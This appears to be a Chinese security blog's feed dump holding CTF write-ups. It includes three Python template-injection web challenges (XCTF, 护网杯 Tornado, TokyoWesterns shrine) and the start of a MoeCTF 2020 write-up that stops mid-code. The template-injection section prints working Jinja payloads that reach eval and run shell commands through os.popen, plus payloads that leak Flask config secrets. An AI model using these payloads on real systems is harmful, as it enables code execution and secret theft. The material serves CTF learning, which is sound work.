class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Description&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;简介&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DC-1是为增长渗透测试经验而搭建的渗透测试靶机。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;它设计给新手，但它的难度取决于你的知识与技能、以及学习能力。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;你需要linux技能（熟悉linux命令行）、基本的渗透测试工具（Kali Linux预装工具或Parrot Security OS）。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;有很多种提权方法，不过，我在靶机中放置了一些flag作为给新手的提示。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;There are five flags in total, but the ultimate goal is to find and read the flag in root&amp;#39;s home directory. You don&amp;#39;t even need to be root to do this, however, you will require root privileges.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;一共有5个flag，但最终目标是读取root目录下的flag。你甚至不需要root账号，但至少需要root权限。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Depending on your skill level, you may be able to skip finding most of these flags and go straight for root.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;如果你够强，你或许会跳过大多数flag直冲root。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;新手或许会遭遇到从来没有遇见过的挑战，去谷歌搜吧。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Pentest" scheme="http://example.com/categories/Pentest/"/>
    
    
    <category term="Pentest" scheme="http://example.com/tags/Pentest/"/>
    
    <category term="DC" scheme="http://example.com/tags/DC/"/>
    
    <category term="Walkthrough" scheme="http://example.com/tags/Walkthrough/"/>
    
  </entry>
  
  <entry>
    <title>三道涉及Python模板注入的Web题</title>
    <link href="http://example.com/2020/10/16/%E4%B8%89%E9%81%93%E6%B6%89%E5%8F%8APython%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9A%84Web%E9%A2%98/"/>
    <id>http://example.com/2020/10/16/%E4%B8%89%E9%81%93%E6%B6%89%E5%8F%8APython%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9A%84Web%E9%A2%98/</id>
    <published>2020-10-16T01:56:45.143Z</published>
    <updated>2020-10-18T06:29:18.375Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-Web-python-template-injection-web"><a href="#XCTF-Web-python-template-injection-web" class="headerlink" title="XCTF-Web_python_template_injection_web"></a>XCTF-Web_python_template_injection_web</h1><h2 id="题目地址"><a href="#题目地址" class="headerlink" title="题目地址"></a>题目地址</h2><p>  <a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5408</a></p><h2 id="网页截图"><a href="#网页截图" class="headerlink" title="网页截图"></a>网页截图</h2><p><img src="https://i.loli.net/2020/10/18/x5cQEyage9RB4HF.png" alt="image-20200812105111805.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>  <strong>python模板注入</strong>:  <a href="https://www.cnblogs.com/tr1ple/p/9415641.html">https://www.cnblogs.com/tr1ple/p/9415641.html</a></p><a id="more"></a><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>尝试查看设置文件</p><p><img src="https://i.loli.net/2020/10/18/3nKqOXI9vCJgEtW.png" alt="image-20200812105539957.png"></p></li><li><p>构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125; </span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>) &#125;&#125; </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>运行后找到了<code>fl4g</code></p><p><img src="https://i.loli.net/2020/10/18/Vnzoj5XGlevDH2J.png" alt="image-20200812110012007.png"></p></li></ol><ol start="3"><li><p>修改payload,查看<code>fl4g</code>的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125; </span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125; </span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat fl4g&quot;).read()&#x27;</span>) &#125;&#125; </span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/18/UEODdVlue4971Go.png" alt="image-20200812110202856.png"></p></li></ol><hr><h1 id="护网杯2018-easyternado-web"><a href="#护网杯2018-easyternado-web" class="headerlink" title="护网杯2018-easyternado_web"></a>护网杯2018-easyternado_web</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>  Tornado 框架</p><h2 id="题目地址-1"><a href="#题目地址-1" class="headerlink" title="题目地址"></a>题目地址</h2><p>  <a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422</a></p><h2 id="网页截图-1"><a href="#网页截图-1" class="headerlink" title="网页截图"></a>网页截图</h2><p><img src="https://i.loli.net/2020/10/18/Pq18LI5tpONMj96.png" alt="image-20200812112214031.png"></p><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>查看文件</p><p>/welcome.txt<br>render</p><p>/flag.txt<br>flag in /fllllllllllllag</p><p>/hints.txt<br>md5(cookie_secret+md5(filename))</p></li></ol><ul><li><code>welcome.txt</code>中提示<code>render()</code>函数</li><li><code>flag.txt</code>中提示flag位于<code>fllllllllllllag</code>中</li><li><code>hints.txt</code>提示了<code>filehash</code>的加密方式</li></ul><ol start="2"><li>尝试不用<code>filehash</code>参数直接访问<code>fllllllllllllag</code></li></ol><p><img src="https://i.loli.net/2020/10/18/JIGjKlFw6o8iBdA.png" alt="image-20200812112636266.png"></p><p>​    刚才提示了<code>render()</code>,怀疑是python模板注入,对<code>?msg=</code>后的参数进行修改.</p><ul><li><code>?msg=123</code>显示了<code>123</code></li><li><code>?msg=&#123;&#123;1&#125;&#125;</code>显示了<code>1</code></li><li><code>?msg=&#123;&#123;1+1&#125;&#125;</code>报错500</li><li><code>?msg=&#123;&#123;config.items()&#125;&#125;</code>显示了<code>Orz</code></li></ul><p>​     由此猜测,服务端屏蔽了运算,但文件属性依然可以访问.尝试访问ternado的配置文件,拿到了<code>cookie_secret</code>.<br>​       <img src="https://i.loli.net/2020/10/18/MJfArNeiBFSkIH9.png" alt="image-20200812113151016.png"></p><ol start="3"><li><p>按照<code>hints.txt</code>中的提示,将<code>/fllllllllllllag</code>转换为MD5<code>3bf9f6cf685a6dd8defadabfb41a03a1</code>,在前面加上<code>32db19e9-78c5-474c-9ec9-bb7157d96eea</code>再次转换得到<code>97065867013cdb5b7cb8f2178c841b39</code></p><ol start="4"><li><p>提交,拿到flag</p><p><img src="https://i.loli.net/2020/10/18/18ghOjQa9vxF3wY.png" alt="image-20200812114236380.png"></p></li></ol></li></ol><hr><h1 id="TokyoWesterns-CTF-shrine-web"><a href="#TokyoWesterns-CTF-shrine-web" class="headerlink" title="TokyoWesterns CTF-shrine_web"></a>TokyoWesterns CTF-shrine_web</h1><h2 id="题目地址-2"><a href="#题目地址-2" class="headerlink" title="题目地址"></a>题目地址</h2><p>  <a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5423&amp;page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5423&amp;page=1</a></p><h2 id="网页源码"><a href="#网页源码" class="headerlink" title="网页源码"></a>网页源码</h2>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>  jinja模板注入，绕过ssti。</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><ul><li>利用了Flask Web；</li><li><code>config[&#39;FLAG&#39;]</code>中包含flag；</li><li>在<code>/shrine/</code>目录下存在jinja模板执行；</li><li><code>safe_jinja()</code>方法会将圆角括号替换为空字符；</li><li><code>config</code>与<code>self</code>的值会被设置为<code>None</code>。</li></ul><h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><ul><li><p>jinja模板执行python命令；</p></li><li><p>利用flask中的<code>get_flashed_messages</code>来获取回显；</p></li><li><p>或者利用flask中的<code>url_for</code>重定向方法。</p><p>payload1:<code>/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p><p>payload2:<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p></li></ul><h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.w3cschool.cn/flask/">Flask教程</a></li><li><a href="https://www.w3cschool.cn/flask/flask_message_flashing.html">Flask 消息闪现</a></li><li><a href="https://blog.csdn.net/dengfan666/article/details/78320188">Flask Web中的 url_for 函数</a></li><li><a href="https://www.jianshu.com/p/f04dae701361">Jinja2 模板用法</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;XCTF-Web-python-template-injection-web&quot;&gt;&lt;a href=&quot;#XCTF-Web-python-template-injection-web&quot; class=&quot;headerlink&quot; title=&quot;XCTF-Web_python_template_injection_web&quot;&gt;&lt;/a&gt;XCTF-Web_python_template_injection_web&lt;/h1&gt;&lt;h2 id=&quot;题目地址&quot;&gt;&lt;a href=&quot;#题目地址&quot; class=&quot;headerlink&quot; title=&quot;题目地址&quot;&gt;&lt;/a&gt;题目地址&lt;/h2&gt;&lt;p&gt;  &lt;a href=&quot;https://adworld.xctf.org.cn/task/answer?type=web&amp;amp;number=3&amp;amp;grade=1&amp;amp;id=5408&quot;&gt;https://adworld.xctf.org.cn/task/answer?type=web&amp;amp;number=3&amp;amp;grade=1&amp;amp;id=5408&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;网页截图&quot;&gt;&lt;a href=&quot;#网页截图&quot; class=&quot;headerlink&quot; title=&quot;网页截图&quot;&gt;&lt;/a&gt;网页截图&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/10/18/x5cQEyage9RB4HF.png&quot; alt=&quot;image-20200812105111805.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;参考资料&quot;&gt;&lt;a href=&quot;#参考资料&quot; class=&quot;headerlink&quot; title=&quot;参考资料&quot;&gt;&lt;/a&gt;参考资料&lt;/h2&gt;&lt;p&gt;  &lt;strong&gt;python模板注入&lt;/strong&gt;:  &lt;a href=&quot;https://www.cnblogs.com/tr1ple/p/9415641.html&quot;&gt;https://www.cnblogs.com/tr1ple/p/9415641.html&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/tags/WEB/"/>
    
    <category term="攻防世界" scheme="http://example.com/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>MoeCTF 2020 WriteUp</title>
    <link href="http://example.com/2020/10/12/MoeCTF2020/"/>
    <id>http://example.com/2020/10/12/MoeCTF2020/</id>
    <published>2020-10-12T09:22:38.000Z</published>
    <updated>2020-10-15T00:54:59.542Z</updated>
    
    <content type="html"><![CDATA[<h1 id="比赛介绍"><a href="#比赛介绍" class="headerlink" title="比赛介绍"></a>比赛介绍</h1><blockquote><p>MoeCTF是西安电子科技大学一年一度的信息安全新生夺旗赛, 由西电信息安全协会面向全体准大学生举办, 题目难度不高且坡度平缓, 比赛平台开设时间很长, 0基础新生可以通过本次比赛对信息安全夺旗赛(CTF)有一个基础且全面的认识, 中学参加过一些CTF比赛的准大学生们也可以通过本次比赛重温CTF赛事.</p><p>MoeCTF除了设有常规CTF比赛相关的分类之外也开设或有计划开设了算法编程类, 运维类, 旨在提供一个知识覆盖全面的做题环境, 同时帮助有过信息学竞赛经历的新生们更快转型.</p></blockquote><a id="more"></a><blockquote><p>MoeCTF的积分方式为最简单的静态积分方式, 选手解题并获取固定的分数, 不设动态积分, 不设一血加成, 选手即使在比赛进行时参赛也不必担心分数差距. 部分题目出题人可能提供题目奖励, 比赛本身无奖项. 比赛结束后平台会继续维护一周供各位选手复盘, 写题解. 西电新生们比赛结束后可能会要求提交题解, 作为西电信息安全协会(XDSEC)2020秋季招新的一个重要砝码. 欢迎大家前来参加比赛, 与各路极客同台竞技, 也欢迎新生们在比赛结束后加入XDSEC, 分享技术, 共同进步!</p><p>西电信息安全协会(XDSEC)是由08, 09级学长自发组建的学生组织, 面向全校各年级同学 ,期间多次与学校合作, 自行管理和发展至今. 协会资源丰富, 在信息安全领域口碑十分优秀. 协会以致力于技术分享与进步为宗旨, 秉承低调, 分享, 专注, 精进, 自由的精神, 旨在为我校热爱信息安全技术的同学建立一个氛围良好的交流平台, 扩大信息安全在我校的影响力.</p></blockquote><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="Re-8-15"><a href="#Re-8-15" class="headerlink" title="Re (8/15)"></a>Re (8/15)</h2><ol><li>逆向工程入门指南（略）</li><li>Welcome To Re</li><li>Thank you Java</li><li>SimpleRe</li><li>Protection</li><li>Real EasyPython</li><li>RollCall</li><li>RxEncode</li></ol><h2 id="Pwn-5-10"><a href="#Pwn-5-10" class="headerlink" title="Pwn (5/10)"></a>Pwn (5/10)</h2><ol><li>Welcome to pwn（略）</li><li>Pwn从入门到入狱（略）</li><li>Baby pwn</li><li>Baby shellcode</li><li>unusual shellcode</li></ol><h2 id="Algorithm-4-7"><a href="#Algorithm-4-7" class="headerlink" title="Algorithm (4/7)"></a>Algorithm (4/7)</h2><ol><li>mess</li><li>Frank，永远滴神</li><li>赤道企鹅，永远滴神</li><li>千层饼</li></ol><h2 id="Crypto-4-10"><a href="#Crypto-4-10" class="headerlink" title="Crypto (4/10)"></a>Crypto (4/10)</h2><ol><li>crypto入门指北（略）</li><li>easycrypto</li><li>rsa_begin</li><li>stream</li></ol><h2 id="Misc-13-17"><a href="#Misc-13-17" class="headerlink" title="Misc (13/17)"></a>Misc (13/17)</h2><ol><li>Welcome</li><li>MD5</li><li>base64</li><li>hey fxck you！</li><li>base64？¿</li><li>Pseudo Encrypt</li><li>不 会 吧 ？ 就 这 ¿</li><li>Cor1e的支票</li><li>A3FXCK</li><li>⑨的完美算数教室</li><li>停不下来了啊啊啊啊啊啊啊</li><li>星空</li><li>简单的社工题</li></ol><h2 id="Classic-Crypto-6-6"><a href="#Classic-Crypto-6-6" class="headerlink" title="Classic Crypto (6/6)"></a>Classic Crypto (6/6)</h2><ol><li>大帝的征程#1</li><li>大帝的征程#2</li><li>外面的世界</li><li>大帝的征程#3</li><li>大帝的征程#维吉尼亚</li><li>大帝的征程#维吉尼亚Ex</li></ol><h2 id="Web-11-11"><a href="#Web-11-11" class="headerlink" title="Web (11/11)"></a>Web (11/11)</h2><ol><li>GET</li><li>POST</li><li>小饼干</li><li>Introduction</li><li>一句话</li><li>EzMath</li><li>三心二意</li><li>俄罗斯头套</li><li>Moe include</li><li>Moe unserialize</li><li>EzXXE</li></ol><h2 id="Android-2-2"><a href="#Android-2-2" class="headerlink" title="Android (2/2)"></a>Android (2/2)</h2><ol><li>Click It！</li><li>Baby Andriod</li></ol><h2 id="Sign-in（略）-2-2"><a href="#Sign-in（略）-2-2" class="headerlink" title="Sign in（略）(2/2)"></a>Sign in（略）(2/2)</h2><h2 id="DevOps-0-1"><a href="#DevOps-0-1" class="headerlink" title="DevOps (0/1)"></a>DevOps (0/1)</h2><h2 id="IoT-0-1"><a href="#IoT-0-1" class="headerlink" title="IoT (0/1)"></a>IoT (0/1)</h2><hr><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><blockquote><p>感谢bb师傅在Re方面对我的指导。</p><p>==bb，yyds.==</p></blockquote><h2 id="02-Welcome-To-Re"><a href="#02-Welcome-To-Re" class="headerlink" title="02 Welcome To Re"></a>02 Welcome To Re</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>拖进IDA</p><p><img src="https://i.loli.net/2020/10/12/DmstAU1zduR2HL9.png" alt="02-01.png"></p><hr><h2 id="03-Thank-you-JavaScript"><a href="#03-Thank-you-JavaScript" class="headerlink" title="03 Thank you JavaScript"></a>03 Thank you JavaScript</h2><p><img src="https://i.loli.net/2020/07/25/rLTZdOaItNPgJnb.jpg" alt="shashasha.jpg"></p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>Js代码去混淆</p><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><p>利用Jspacker去混淆</p><p><img src="https://i.loli.net/2020/10/12/sOvPuXcDbtgaWKm.png" alt="03-01.png"></p><hr><h2 id="04-SimpleRe"><a href="#04-SimpleRe" class="headerlink" title="04 SimpleRe"></a>04 SimpleRe</h2><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>IDA，盘它</p><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>主函数中调用enc函数，跟进</p></li><li><p>enc是一个加密函数，将处理后的明文与aim字符串对比，跟进aim</p><p><img src="https://i.loli.net/2020/10/12/xPkZey2falchE4d.png" alt="04-01.png"></p></li><li><p>由于XOR可逆，直接复制enc的伪代码，稍作修改</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">string</span> a1 = <span class="string">&quot;rpz|kydKw^qTl@Y/m2f/J-@o^k.,qkb&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> out[<span class="number">50</span>];</span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> i4,i3,i2,i1,nn,mm,ll,kk,jj,ii,n,m,l,k,j,i;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">30</span>; ++i )</span><br><span class="line">out[i] = a1[i] ^ <span class="number">0x17</span>;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">30</span>; ++j )</span><br><span class="line">out[j] ^= <span class="number">0x39</span>u;</span><br><span class="line"><span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">30</span>; ++k )</span><br><span class="line">out[k] ^= <span class="number">0x4B</span>u;</span><br><span class="line"><span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">30</span>; ++l )</span><br><span class="line">out[l] ^= <span class="number">0x4A</span>u;</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">30</span>; ++m )</span><br><span class="line">out[m] ^= <span class="number">0x49</span>u;</span><br><span class="line"><span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">30</span>; ++n )</span><br><span class="line">out[n] ^= <span class="number">0x26</span>u;</span><br><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">30</span>; ++ii )</span><br><span class="line">out[ii] ^= <span class="number">0x15</span>u;</span><br><span class="line"><span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">30</span>; ++jj )</span><br><span class="line">out[jj] ^= <span class="number">0x61</span>u;</span><br><span class="line"><span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt;= <span class="number">30</span>; ++kk )</span><br><span class="line">out[kk] ^= <span class="number">0x56</span>u;</span><br><span class="line"><span class="keyword">for</span> ( ll = <span class="number">0</span>; ll &lt;= <span class="number">30</span>; ++ll )</span><br><span class="line">out[ll] ^= <span class="number">0x1B</span>u;</span><br><span class="line"><span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt;= <span class="number">30</span>; ++mm )</span><br><span class="line">out[mm] ^= <span class="number">0x21</span>u;</span><br><span class="line"><span class="keyword">for</span> ( nn = <span class="number">0</span>; nn &lt;= <span class="number">30</span>; ++nn )</span><br><span class="line">out[nn] ^= <span class="number">0x40</span>u;</span><br><span class="line"><span class="keyword">for</span> ( i1 = <span class="number">0</span>; i1 &lt;= <span class="number">30</span>; ++i1 )</span><br><span class="line">out[i1] ^= <span class="number">0x57</span>u;</span><br><span class="line"><span class="keyword">for</span> ( i2 = <span class="number">0</span>; i2 &lt;= <span class="number">30</span>; ++i2 )</span><br><span class="line">out[i2] ^= <span class="number">0x2E</span>u;</span><br><span class="line"><span class="keyword">for</span> ( i3 = <span class="number">0</span>; i3 &lt;= <span class="number">30</span>; ++i3 )</span><br><span class="line">out[i3] ^= <span class="number">0x49</span>u;</span><br><span class="line"><span class="keyword">for</span> ( i4 = <span class="number">0</span>; i4 &lt;= <span class="number">30</span>; ++i4 )</span><br><span class="line">out[i4] ^= <span class="number">0x37</span>u;</span><br><span class="line"><span class="keyword">for</span>(<span 